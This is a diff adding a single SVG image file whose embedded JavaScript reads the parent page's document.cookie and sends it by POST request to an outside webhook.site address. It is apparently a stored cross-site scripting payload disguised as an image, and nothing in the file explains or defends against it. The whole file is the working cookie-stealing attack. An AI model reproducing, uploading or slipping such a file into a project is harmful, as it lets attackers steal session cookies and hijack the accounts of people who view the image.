@@ -1,0 +1,16 @@
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" version="1.0" x="0.00000000" y="0.00000000" width="500.00000" height="500.00000" id="svg2">
+  <script type="text/javascript">
+    console.log(window.parent.document.cookie);
+    fetch("https://webhook.site/8ecbfa58-3e95-4743-92cf-3d215f6920d7", {
+      method: 'POST',
+      crossorigin: true,  
+      mode: 'no-cors',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin':'*',
+      }, 
+      body: JSON.stringify(window.parent.document.cookie),
+    });
+  </script>
+</svg>
